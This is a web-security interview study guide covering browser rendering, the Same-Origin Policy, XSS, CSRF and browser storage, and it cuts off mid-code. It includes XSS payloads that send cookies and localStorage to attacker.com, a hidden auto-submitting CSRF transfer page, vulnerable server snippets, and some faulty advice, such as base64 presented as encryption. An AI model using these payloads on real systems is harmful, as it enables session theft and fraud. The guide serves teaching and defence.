# Browser Fundamentals & Security Interview Questions

## 🎯 Browser Architecture Visualization

```
┌─────────────────────────────────────────────────────────────────────┐
│                       BROWSER ARCHITECTURE                          │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    BROWSER PROCESS                           │   │
│  │  • Main process coordination                                │   │
│  │  • Network requests                                         │   │
│  │  • File system access                                       │   │
│  │  • UI (address bar, bookmarks)                             │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                  │                                 │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                   RENDERER PROCESSES                        │   │
│  │                                                             │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │   │
│  │  │    TAB 1    │  │    TAB 2    │  │    TAB 3    │         │   │
│  │  │             │  │             │  │             │         │   │
│  │  │ Main Thread │  │ Main Thread │  │ Main Thread │         │   │
│  │  │ ├─ JS       │  │ ├─ JS       │  │ ├─ JS       │         │   │
│  │  │ ├─ DOM      │  │ ├─ DOM      │  │ ├─ DOM      │         │   │
│  │  │ └─ Style    │  │ └─ Style    │  │ └─ Style    │         │   │
│  │  │             │  │             │  │             │         │   │
│  │  │ Compositor  │  │ Compositor  │  │ Compositor  │         │   │
│  │  │ Thread      │  │ Thread      │  │ Thread      │         │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘         │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                  │                                 │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                     GPU PROCESS                             │   │
│  │  • Graphics rendering                                       │   │
│  │  • Hardware acceleration                                    │   │
│  │  • WebGL, Canvas                                           │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                  │                                 │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                   PLUGIN PROCESSES                          │   │
│  │  • Isolated plugin execution                               │   │
│  │  • Flash, PDF viewers                                      │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

## 🎯 Progressive Interview Questions

### 🟢 BEGINNER LEVEL

#### Q1: How does a browser render a webpage?

**Answer:**
Browser rendering follows a specific pipeline to convert HTML, CSS, and JavaScript into pixels on screen.

**Critical Rendering Path:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                        RENDERING PIPELINE                           │
│                                                                     │
│  1. HTML Parsing → DOM Construction                                 │
│     │ <html> → Document Object Model                               │
│     │                                                               │
│  2. CSS Parsing → CSSOM Construction                                │
│     │ CSS rules → CSS Object Model                                 │
│     │                                                               │
│  3. DOM + CSSOM → Render Tree                                       │
│     │ Combines structure and styling                               │
│     │                                                               │
│  4. Layout (Reflow)                                                 │
│     │ Calculate positions and sizes                                │
│     │                                                               │
│  5. Paint                                                           │
│     │ Fill in pixels for each element                              │
│     │                                                               │
│  6. Composite                                                       │
│     │ Combine layers into final image                              │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    LAYER MODEL                               │   │
│  │                                                             │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐                     │   │
│  │  │ Layer 1 │  │ Layer 2 │  │ Layer 3 │                     │   │
│  │  │ (Base)  │  │(z-index)│  │(transform)                    │   │
│  │  └─────────┘  └─────────┘  └─────────┘                     │   │
│  │       │           │           │                             │   │
│  │       └───────────┼───────────┘                             │   │
│  │                   ▼                                         │   │
│  │            ┌─────────────┐                                  │   │
│  │            │ Compositor  │                                  │   │
│  │            │   Thread    │                                  │   │
│  │            └─────────────┘                                  │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

**Detailed Process:**

```javascript
// 1. HTML Parsing
/*
<html>
  <head>
    <style>
      .header { background: blue; }
    </style>
  </head>
  <body>
    <div class="header">Hello World</div>
  </body>
</html>
*/

// Creates DOM tree:
const domTree = {
    html: {
        head: {
            style: { textContent: '.header { background: blue; }' }
        },
        body: {
            div: { 
                className: 'header',
                textContent: 'Hello World'
            }
        }
    }
};

// 2. CSS Parsing creates CSSOM
const cssomTree = {
    '.header': {
        background: 'blue'
    }
};

// 3. Render Tree (combines DOM + CSSOM)
const renderTree = {
    div: {
        className: 'header',
        styles: { background: 'blue' },
        content: 'Hello World'
    }
};

// 4. Layout calculation
const layoutInfo = {
    div: {
        x: 0,
        y: 0,
        width: 300,
        height: 50,
        background: 'blue'
    }
};

// 5. Paint instructions
const paintInstructions = [
    { type: 'fillRect', x: 0, y: 0, width: 300, height: 50, color: 'blue' },
    { type: 'fillText', text: 'Hello World', x: 10, y: 30, color: 'black' }
];
```

**Performance Considerations:**
```javascript
// Triggering reflow/repaint
element.style.width = '200px'; // Triggers layout + paint
element.style.height = '100px'; // Triggers layout + paint

// Optimized - batch DOM changes
element.style.cssText = 'width: 200px; height: 100px;'; // Single layout + paint

// Use transform/opacity for animations (compositing only)
element.style.transform = 'translateX(100px)'; // GPU accelerated
element.style.opacity = '0.5'; // GPU accelerated

// Force layer creation for complex animations
element.style.willChange = 'transform';
// or
element.style.transform = 'translateZ(0)'; // Hack to create layer
```

#### Q2: What is the Same-Origin Policy and why is it important?

**Answer:**
The Same-Origin Policy is a critical security concept that restricts how documents or scripts from one origin can interact with resources from another origin.

**Origin Definition:**
An origin consists of three parts:
1. **Protocol** (http/https)
2. **Domain** (example.com)  
3. **Port** (80, 443, 3000, etc.)

**Same-Origin Examples:**
```javascript
// Current page: https://example.com:443/page

// SAME ORIGIN
'https://example.com/other-page'     // ✅ Same protocol, domain, port
'https://example.com:443/api/data'   // ✅ Same protocol, domain, port

// DIFFERENT ORIGINS
'http://example.com/page'            // ❌ Different protocol
'https://subdomain.example.com/page' // ❌ Different domain  
'https://example.com:8080/page'      // ❌ Different port
'https://other-site.com/page'        // ❌ Different domain
```

**What Same-Origin Policy Restricts:**

**1. XMLHttpRequest and Fetch:**
```javascript
// Current origin: https://mysite.com

// This will be blocked by Same-Origin Policy
fetch('https://api.other-site.com/data')
    .then(response => response.json())
    .catch(error => {
        // CORS error: blocked by Same-Origin Policy
        console.error('CORS Error:', error);
    });

// This works (same origin)
fetch('/api/data') // Resolves to https://mysite.com/api/data
    .then(response => response.json())
    .then(data => console.log(data));

// Working with CORS headers
fetch('https://api.other-site.com/data', {
    method: 'GET',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => {
    // Only works if server sends proper CORS headers:
    // Access-Control-Allow-Origin: https://mysite.com
    // or
    // Access-Control-Allow-Origin: *
    return response.json();
});
```

**2. DOM Access:**
```javascript
// Parent page: https://mysite.com
// Iframe: https://other-site.com

// This will throw a SecurityError
try {
    const iframe = document.getElementById('cross-origin-iframe');
    const iframeDocument = iframe.contentDocument; // ❌ Blocked
    const iframeData = iframe.contentWindow.someData; // ❌ Blocked
} catch (error) {
    console.error('Same-Origin Policy violation:', error);
}

// This works (same origin)
const sameOriginIframe = document.getElementById('same-origin-iframe');
const iframeDocument = sameOriginIframe.contentDocument; // ✅ Allowed
```

**3. Cookie Access:**
```javascript
// Cookies are subject to Same-Origin Policy
document.cookie = 'sessionId=abc123'; // Only accessible to same origin

// Cross-site cookie handling
// Set with SameSite attribute
document.cookie = 'sessionId=abc123; SameSite=Strict'; // Strict same-site
document.cookie = 'tracking=xyz789; SameSite=Lax';     // Lax same-site
document.cookie = 'analytics=def456; SameSite=None; Secure'; // Cross-site (requires HTTPS)
```

**Bypassing Same-Origin Policy (Legitimate Methods):**

**1. CORS (Cross-Origin Resource Sharing):**
```javascript
// Server response headers
/*
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
*/

// Preflight request for complex requests
const complexRequest = {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer token123'
    },
    body: JSON.stringify({ data: 'example' })
};

fetch('https://api.other-site.com/data', complexRequest);
// Browser sends OPTIONS preflight request first
```

**2. JSONP (Legacy method):**
```javascript
// JSONP bypasses SOP by using script tags
function handleJsonpResponse(data) {
    console.log('Received data:', data);
}

const script = document.createElement('script');
script.src = 'https://api.example.com/data?callback=handleJsonpResponse';
document.head.appendChild(script);

// Server responds with:
// handleJsonpResponse({"key": "value"});
```

**3. PostMessage API:**
```javascript
// Parent window (https://mysite.com)
const iframe = document.getElementById('cross-origin-iframe');

// Send message to iframe
iframe.contentWindow.postMessage({
    type: 'REQUEST_DATA',
    payload: { userId: 123 }
}, 'https://other-site.com');

// Listen for responses
window.addEventListener('message', (event) => {
    // Verify origin for security
    if (event.origin !== 'https://other-site.com') {
        return;
    }
    
    console.log('Received from iframe:', event.data);
});

// Iframe code (https://other-site.com)
window.addEventListener('message', (event) => {
    // Verify origin
    if (event.origin !== 'https://mysite.com') {
        return;
    }
    
    if (event.data.type === 'REQUEST_DATA') {
        // Process request and respond
        event.source.postMessage({
            type: 'RESPONSE',
            data: { result: 'success' }
        }, event.origin);
    }
});
```

#### Q3: What are different types of XSS attacks and how do you prevent them?

**Answer:**
Cross-Site Scripting (XSS) attacks inject malicious scripts into web applications to steal data or perform unauthorized actions.

**Types of XSS Attacks:**

**1. Stored XSS (Persistent):**
Malicious script is stored on the server and executed when other users view the content.

```javascript
// Vulnerable code - user input stored without sanitization
app.post('/comment', (req, res) => {
    const comment = req.body.comment; // Could contain: <script>alert('XSS')</script>
    
    // Directly storing unsanitized input
    database.saveComment({
        text: comment, // ❌ Dangerous!
        userId: req.user.id
    });
    
    res.redirect('/comments');
});

// Vulnerable template rendering
// comments.html
/*
{{#each comments}}
    <div class="comment">
        {{{text}}} <!-- Triple braces = unescaped HTML -->
    </div>
{{/each}}
*/

// Attack payload
const maliciousComment = `
    <script>
        // Steal cookies
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                currentUrl: window.location.href
            })
        });
    </script>
`;
```

**2. Reflected XSS (Non-Persistent):**
Malicious script is immediately reflected back in the response.

```javascript
// Vulnerable search functionality
app.get('/search', (req, res) => {
    const query = req.query.q;
    
    // Directly reflecting user input
    res.send(`
        <h1>Search Results</h1>
        <p>You searched for: ${query}</p> <!-- ❌ Dangerous! -->
        <div id="results">No results found</div>
    `);
});

// Attack URL
// https://example.com/search?q=<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>

// When user clicks this link, their cookies are sent to attacker
```

**3. DOM-based XSS:**
Vulnerability exists in client-side JavaScript that processes user input.

```javascript
// Vulnerable client-side code
function displayMessage() {
    const message = new URLSearchParams(window.location.search).get('message');
    
    // Directly inserting into DOM without sanitization
    document.getElementById('content').innerHTML = message; // ❌ Dangerous!
}

// Attack URL
// https://example.com/page?message=<img src=x onerror="fetch('https://attacker.com/steal?data='+document.cookie)">

// Attack payload in hash fragment
// https://example.com/page#<script>alert('XSS')</script>

function processHash() {
    const hash = window.location.hash.slice(1);
    document.getElementById('content').innerHTML = hash; // ❌ Dangerous!
}
```

**XSS Prevention Techniques:**

**1. Input Sanitization and Validation:**
```javascript
const DOMPurify = require('dompurify');
const validator = require('validator');

// Server-side sanitization
function sanitizeInput(input) {
    // Remove/encode dangerous characters
    return validator.escape(input);
}

// Client-side sanitization
function sanitizeHTML(html) {
    return DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
        ALLOWED_ATTR: []
    });
}

// Safe comment handling
app.post('/comment', (req, res) => {
    const rawComment = req.body.comment;
    
    // Sanitize input
    const sanitizedComment = sanitizeInput(rawComment);
    
    database.saveComment({
        text: sanitizedComment,
        userId: req.user.id
    });
    
    res.redirect('/comments');
});
```

**2. Output Encoding:**
```javascript
// Template with proper escaping
// Using Handlebars (auto-escapes by default)
/*
{{#each comments}}
    <div class="comment">
        {{text}} <!-- Double braces = HTML escaped -->
    </div>
{{/each}}
*/

// Manual HTML escaping
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Safe search results
app.get('/search', (req, res) => {
    const query = escapeHtml(req.query.q);
    
    res.send(`
        <h1>Search Results</h1>
        <p>You searched for: ${query}</p> <!-- Now safe -->
        <div id="results">No results found</div>
    `);
});
```

**3. Content Security Policy (CSP):**
```javascript
// CSP headers
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline' https://cdn.example.com",
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
        "img-src 'self' data: https:",
        "font-src 'self' https://fonts.gstatic.com",
        "connect-src 'self' https://api.example.com",
        "frame-ancestors 'none'",
        "object-src 'none'",
        "base-uri 'self'"
    ].join('; '));
    
    next();
});

// CSP with nonces for inline scripts
const crypto = require('crypto');

app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('hex');
    res.setHeader('Content-Security-Policy', 
        `script-src 'self' 'nonce-${res.locals.nonce}'`
    );
    next();
});

// In template
/*
<script nonce="{{nonce}}">
    // This inline script is allowed
    console.log('Safe inline script');
</script>
*/
```

**4. Safe DOM Manipulation:**
```javascript
// Safe DOM manipulation practices
function safeDisplayMessage(message) {
    const container = document.getElementById('content');
    
    // Use textContent instead of innerHTML for plain text
    container.textContent = message; // ✅ Safe - treats as text
    
    // For HTML content, sanitize first
    if (needsHTML) {
        const sanitizedHTML = DOMPurify.sanitize(message);
        container.innerHTML = sanitizedHTML; // ✅ Safe after sanitization
    }
}

// Safe attribute setting
function safeSetAttribute(element, value) {
    // Validate attribute values
    if (typeof value === 'string' && value.length < 1000) {
        element.setAttribute('data-value', value);
    }
}

// Safe URL handling
function safeRedirect(url) {
    // Validate URL to prevent javascript: URLs
    try {
        const urlObj = new URL(url, window.location.origin);
        if (urlObj.protocol === 'http:' || urlObj.protocol === 'https:') {
            window.location.href = urlObj.href;
        }
    } catch (error) {
        console.error('Invalid URL:', error);
    }
}

// Safe event handler assignment
function safeAddEventHandler(element, eventType, handler) {
    // Use addEventListener instead of innerHTML with event attributes
    element.addEventListener(eventType, handler); // ✅ Safe
    
    // Avoid:
    // element.innerHTML = `<button onclick="${userInput}">Click</button>`; // ❌ Dangerous
}
```

**5. Framework-Specific Protection:**

**React:**
```jsx
// React automatically escapes values in JSX
function CommentComponent({ comment }) {
    return (
        <div>
            {/* Automatically escaped */}
            <p>{comment.text}</p>
            
            {/* Dangerous - avoid unless absolutely necessary */}
            <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />
        </div>
    );
}

// Safe HTML rendering with sanitization
import DOMPurify from 'dompurify';

function SafeHTMLComponent({ htmlContent }) {
    const sanitizedHTML = DOMPurify.sanitize(htmlContent);
    
    return (
        <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />
    );
}
```

**Vue:**
```vue
<template>
    <!-- Automatically escaped -->
    <p>{{ comment.text }}</p>
    
    <!-- Dangerous - avoid unless necessary -->
    <div v-html="sanitizedHTML"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
    props: ['comment'],
    computed: {
        sanitizedHTML() {
            return DOMPurify.sanitize(this.comment.html);
        }
    }
};
</script>
```

#### Q4: Explain CSRF attacks and protection mechanisms.

**Answer:**
Cross-Site Request Forgery (CSRF) tricks users into performing unintended actions on web applications where they're authenticated.

**How CSRF Attacks Work:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                          CSRF ATTACK FLOW                           │
│                                                                     │
│  1. User logs into legitimate site (bank.com)                      │
│     ┌─────────┐         ┌─────────────┐                            │
│     │  User   │────────▶│  bank.com   │                            │
│     └─────────┘         └─────────────┘                            │
│          │                      │                                  │
│          │               Session Cookie                             │
│          │◄─────────────────────┘                                  │
│                                                                     │
│  2. User visits malicious site while still logged in               │
│     ┌─────────┐         ┌─────────────┐                            │
│     │  User   │────────▶│ attacker.com│                            │
│     └─────────┘         └─────────────┘                            │
│                                  │                                 │
│  3. Malicious site sends forged request to bank.com                │
│                                  │                                 │
│                                  ▼                                 │
│     ┌─────────┐         ┌─────────────┐                            │
│     │Browser  │────────▶│  bank.com   │                            │
│     │(w/cookie)│        │(thinks user │                            │
│     └─────────┘         │sent request)│                            │
│                         └─────────────┘                            │
└─────────────────────────────────────────────────────────────────────┘
```

**Example CSRF Attack:**

```html
<!-- Malicious website (attacker.com) -->
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Check out these cute cat pictures!</h1>
    
    <!-- Hidden form that submits to victim's bank -->
    <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display: none;">
        <input type="hidden" name="to_account" value="attacker_account_123">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="description" value="Transfer to friend">
    </form>
    
    <!-- Auto-submit the form -->
    <script>
        document.getElementById('csrf-form').submit();
    </script>
    
    <!-- Alternative: Image-based attack -->
    <img src="https://bank.com/transfer?to_account=attacker_account_123&amount=10000" 
         style="display: none;">
    
    <!-- AJAX-based attack -->
    <script>
        fetch('https://bank.com/transfer', {
            method: 'POST',
            credentials: 'include', // Include cookies
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                to_account: 'attacker_account_123',
                amount: 10000
            })
        });
    </script>
</body>
</html>
```

**CSRF Protection Mechanisms:**

**1. CSRF Tokens (Synchronizer Token Pattern):**
```javascript
const crypto = require('crypto');
const session = require('express-session');

// Generate CSRF token
function generateCSRFToken() {
    return crypto.randomBytes(32).toString('hex');
}

// Middleware to add CSRF token to session
app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = generateCSRFToken();
    }
    res.locals.csrfToken = req.session.csrfToken;
    next();
});

// CSRF validation middleware
function validateCSRF(req, res, next) {
    const sessionToken = req.session.csrfToken;
    const requestToken = req.body.csrfToken || req.headers['x-csrf-token'];
    
    if (!sessionToken || sessionToken !== requestToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    
    next();
}

// Protected route
app.post('/transfer', validateCSRF, (req, res) => {
    // Process transfer only if CSRF token is valid
    const { to_account, amount } = req.body;
    
    // Perform transfer logic
    res.json({ success: true, message: 'Transfer completed' });
});

// Serve form with CSRF token
app.get('/transfer-form', (req, res) => {
    res.send(`
        <form action="/transfer" method="POST">
            <input type="hidden" name="csrfToken" value="${res.locals.csrfToken}">
            <input type="text" name="to_account" placeholder="To Account">
            <input type="number" name="amount" placeholder="Amount">
            <button type="submit">Transfer</button>
        </form>
    `);
});
```

**2. SameSite Cookies:**
```javascript
// Configure session with SameSite attribute
app.use(session({
    secret: 'your-secret-key',
    cookie: {
        httpOnly: true,
        secure: true, // HTTPS only
        sameSite: 'strict' // or 'lax'
    }
}));

// Different SameSite values:
// 'strict' - Cookie never sent with cross-site requests
// 'lax' - Cookie sent with top-level navigation (links)
// 'none' - Cookie sent with all cross-site requests (requires Secure)

// Set SameSite on individual cookies
res.cookie('sessionId', 'abc123', {
    sameSite: 'strict',
    secure: true,
    httpOnly: true
});
```

**3. Double Submit Cookie Pattern:**
```javascript
// Generate token and set both in cookie and require in form
app.use((req, res, next) => {
    if (!req.cookies.csrfToken) {
        const token = generateCSRFToken();
        res.cookie('csrfToken', token, {
            httpOnly: false, // Accessible to JavaScript
            secure: true,
            sameSite: 'strict'
        });
        req.csrfToken = token;
    } else {
        req.csrfToken = req.cookies.csrfToken;
    }
    next();
});

// Validation middleware
function validateDoubleSubmitCSRF(req, res, next) {
    const cookieToken = req.cookies.csrfToken;
    const requestToken = req.body.csrfToken || req.headers['x-csrf-token'];
    
    if (!cookieToken || cookieToken !== requestToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    
    next();
}

// Client-side: Include token in AJAX requests
// JavaScript to get token from cookie
function getCSRFToken() {
    return document.cookie
        .split('; ')
        .find(row => row.startsWith('csrfToken='))
        ?.split('=')[1];
}

// Include in fetch requests
fetch('/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': getCSRFToken()
    },
    body: JSON.stringify({
        to_account: 'account123',
        amount: 1000
    })
});
```

**4. Origin and Referer Checking:**
```javascript
function validateOrigin(req, res, next) {
    const origin = req.headers.origin;
    const referer = req.headers.referer;
    const allowedOrigins = ['https://mysite.com', 'https://www.mysite.com'];
    
    // Check Origin header
    if (origin && !allowedOrigins.includes(origin)) {
        return res.status(403).json({ error: 'Forbidden origin' });
    }
    
    // Check Referer header as fallback
    if (!origin && referer) {
        const refererOrigin = new URL(referer).origin;
        if (!allowedOrigins.includes(refererOrigin)) {
            return res.status(403).json({ error: 'Forbidden referer' });
        }
    }
    
    // Require either Origin or Referer for state-changing requests
    if (!origin && !referer) {
        return res.status(403).json({ error: 'Missing origin/referer headers' });
    }
    
    next();
}

// Apply to state-changing routes
app.use(['/transfer', '/delete', '/update'], validateOrigin);
```

**5. Custom Headers:**
```javascript
// Require custom header for AJAX requests
function requireCustomHeader(req, res, next) {
    const customHeader = req.headers['x-requested-with'];
    
    if (customHeader !== 'XMLHttpRequest') {
        return res.status(403).json({ error: 'Missing required header' });
    }
    
    next();
}

// Client-side: Always include custom header
fetch('/api/sensitive-action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest' // Custom header
    },
    body: JSON.stringify(data)
});

// Using axios (automatically includes X-Requested-With)
axios.post('/api/sensitive-action', data);
```

**6. Framework-Specific CSRF Protection:**

**Express with csurf middleware:**
```javascript
const csrf = require('csurf');

// CSRF middleware
const csrfProtection = csrf({ 
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    }
});

app.use(csrfProtection);

// Make token available to templates
app.use((req, res, next) => {
    res.locals.csrfToken = req.csrfToken();
    next();
});

// In templates
/*
<form action="/transfer" method="POST">
    <input type="hidden" name="_csrf" value="{{csrfToken}}">
    <!-- form fields -->
</form>
*/
```

**React with CSRF protection:**
```jsx
import { useState, useEffect } from 'react';

function TransferForm() {
    const [csrfToken, setCsrfToken] = useState('');
    
    useEffect(() => {
        // Get CSRF token from meta tag or API
        const token = document.querySelector('meta[name="csrf-token"]')?.content;
        setCsrfToken(token);
    }, []);
    
    const handleSubmit = async (formData) => {
        const response = await fetch('/transfer', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrfToken
            },
            body: JSON.stringify(formData)
        });
        
        if (!response.ok) {
            throw new Error('Transfer failed');
        }
        
        return response.json();
    };
    
    return (
        <form onSubmit={handleSubmit}>
            <input type="hidden" name="csrfToken" value={csrfToken} />
            {/* form fields */}
        </form>
    );
}
```

#### Q5: What are different storage mechanisms in browsers and their security implications?

**Answer:**
Browsers provide various storage mechanisms, each with different characteristics and security considerations.

**Storage Mechanisms Overview:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    BROWSER STORAGE MECHANISMS                       │
│                                                                     │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐ │
│  │   COOKIES   │  │   LOCAL     │  │   SESSION   │  │   INDEXED   │ │
│  │             │  │  STORAGE    │  │   STORAGE   │  │     DB      │ │
│  │             │  │             │  │             │  │             │ │
│  │ Size: 4KB   │  │ Size: 5-10MB│  │ Size: 5-10MB│  │ Size: ~50MB │ │
│  │ HTTP: Yes   │  │ HTTP: No    │  │ HTTP: No    │  │ HTTP: No    │ │
│  │ Expire: Yes │  │ Expire: No  │  │ Expire: Tab │  │ Expire: No  │ │
│  │ Secure: Yes │  │ Secure: No  │  │ Secure: No  │  │ Secure: No  │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘ │
│                                                                     │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐ │
│  │    CACHE    │  │   WEB SQL   │  │   FILE API  │  │   MEMORY    │ │
│  │     API     │  │(Deprecated) │  │             │  │             │ │
│  │             │  │             │  │             │  │             │ │
│  │ Size: Quota │  │ Size: 5MB   │  │ Size: User  │  │ Size: RAM   │ │
│  │ HTTP: No    │  │ HTTP: No    │  │ HTTP: No    │  │ HTTP: No    │ │
│  │ Expire: LRU │  │ Expire: No  │  │ Expire: No  │  │ Expire: Tab │ │
│  │ Secure: Yes │  │ Secure: No  │  │ Secure: Yes │  │ Secure: No  │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
```

**1. HTTP Cookies:**

```javascript
// Setting cookies with security attributes
document.cookie = "sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=3600";

// Cookie attributes explained:
// Secure: Only sent over HTTPS
// HttpOnly: Not accessible via JavaScript (prevents XSS)
// SameSite: Controls cross-site request behavior
// Max-Age: Expiration time in seconds
// Domain: Which domains can access the cookie
// Path: Which paths can access the cookie

// Server-side cookie management (Express.js)
app.use((req, res, next) => {
    // Set secure session cookie
    res.cookie('sessionId', generateSessionId(), {
        httpOnly: true,    // Prevent XSS access
        secure: true,      // HTTPS only
        sameSite: 'strict', // CSRF protection
        maxAge: 24 * 60 * 60 * 1000, // 24 hours
        domain: '.example.com', // Allow subdomains
        path: '/'          // Available to entire site
    });
    
    next();
});

// Reading cookies securely
function getSecureCookie(name) {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const [key, value] = cookie.trim().split('=');
        if (key === name) {
            return decodeURIComponent(value);
        }
    }
    return null;
}

// Cookie security vulnerabilities
// ❌ Insecure cookie
document.cookie = "token=secret123"; // No security attributes

// ✅ Secure cookie
document.cookie = "token=secret123; Secure; HttpOnly; SameSite=Strict";
```

**2. localStorage:**

```javascript
// localStorage - persistent across browser sessions
class SecureLocalStorage {
    static setItem(key, value, encrypt = false) {
        try {
            let processedValue = value;
            
            if (encrypt && typeof value === 'string') {
                // Simple encryption (use proper crypto in production)
                processedValue = btoa(value); // Base64 encoding
            }
            
            const item = {
                value: processedValue,
                timestamp: Date.now(),
                encrypted: encrypt
            };
            
            localStorage.setItem(key, JSON.stringify(item));
        } catch (error) {
            console.error('Failed to set localStorage item:', error);
        }
    }
    
    static getItem(key, decrypt = false) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            
            const parsed = JSON.parse(item);
            let value = parsed.value;
            
            if (decrypt && parsed.encrypted) {
                value = atob(value); // Base64 decoding
            }
            
            return value;
        } catch (error) {
            console.error('Failed to get localStorage item:', error);
            return null;
        }
    }
    
    static removeItem(key) {
        localStorage.removeItem(key);
    }
    
    static clear() {
        localStorage.clear();
    }
    
    // Clean up expired items
    static cleanup(maxAge = 24 * 60 * 60 * 1000) { // 24 hours
        const now = Date.now();
        
        for (let i = localStorage.length - 1; i >= 0; i--) {
            const key = localStorage.key(i);
            try {
                const item = JSON.parse(localStorage.getItem(key));
                if (item.timestamp && (now - item.timestamp) > maxAge) {
                    localStorage.removeItem(key);
                }
            } catch (error) {
                // Invalid JSON, remove item
                localStorage.removeItem(key);
            }
        }
    }
}

// Usage
SecureLocalStorage.setItem('userPrefs', JSON.stringify({ theme: 'dark' }));
SecureLocalStorage.setItem('sensitiveData', 'secret', true); // Encrypted

// Security considerations for localStorage
// ❌ Storing sensitive data in plain text
localStorage.setItem('creditCard', '1234-5678-9012-3456');

// ✅ Only store non-sensitive data or encrypt
localStorage.setItem('userPreferences', JSON.stringify({
    theme: 'dark',
    language: 'en'
}));
```

**3. sessionStorage:**

```javascript
// sessionStorage - cleared when tab closes
class SessionStorageManager {
    static setSecureItem(key, value) {
        try {
            const item = {
                value: value,
                origin: window.location.origin,
                timestamp: Date.now()
            };
            
            sessionStorage.setItem(key, JSON.stringify(item));
        } catch (error) {
            console.error('SessionStorage quota exceeded:', error);
        }
    }
    
    static getSecureItem(key) {
        try {
            const item = sessionStorage.getItem(key);
            if (!item) return null;
            
            const parsed = JSON.parse(item);
            
            // Verify origin matches (basic security check)
            if (parsed.origin !== window.location.origin) {
                sessionStorage.removeItem(key);
                return null;
            }
            
            return parsed.value;
        } catch (error) {
            console.error('Failed to parse sessionStorage item:', error);
            return null;
        }
    }
    
    // Transfer sessionStorage between tabs (same origin)
    static transferToNewTab() {
        const data = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data[key] = sessionStorage.getItem(key);
        }
        
        // Store in localStorage temporarily
        localStorage.setItem('sessionTransfer', JSON.stringify(data));
        
        // Clean up after short delay
        setTimeout(() => {
            localStorage.removeItem('sessionTransfer');
        }, 1000);
    }
    
    static receiveFromOtherTab() {
        const transferData = localStorage.getItem('sessionTransfer');
        if (transferData) {
            const data = JSON.parse(transferData);
            Object.entries(data).forEach(([key, value]) => {
                sessionStorage.setItem(key, value);
            });
        }
    }
}

// Form data persistence across page reloads
function saveFormData(formId) {
    const form = document.getElementById(formId);
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());
    
    SessionStorageManager.setSecureItem(`form_${formId}`, data);
}

function restoreFormData(formId) {
    const data = SessionStorageManager.getSecureItem(`form_${formId}`);
    if (data) {
        const form = document.getElementById(formId);
        Object.entries(data).forEach(([name, value]) => {
            const field = form.querySelector(`[name="${name}"]`);
            if (field) {
                field.value = value;
            }
        });
    }
}
```

**4. IndexedDB:**

```javascript
// IndexedDB - NoSQL database for larger, structured data
class SecureIndexedDB {
    constructor(dbName, version = 1) {
        this.dbName = dbName;
        this.version = version;
        this.db = null;
    }
    
    async init() {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(this.dbName, this.version);
            
            request.onerror = () => reject(request.error);
            request.onsuccess = () => {
                this.db = request.result;
                resolve(this.db);
            };
            
            request.onupgradeneeded = (event) => {
                const db = event.target.result;
                
                // Create object stores
                if (!db.objectStoreNames.contains('userData')) {
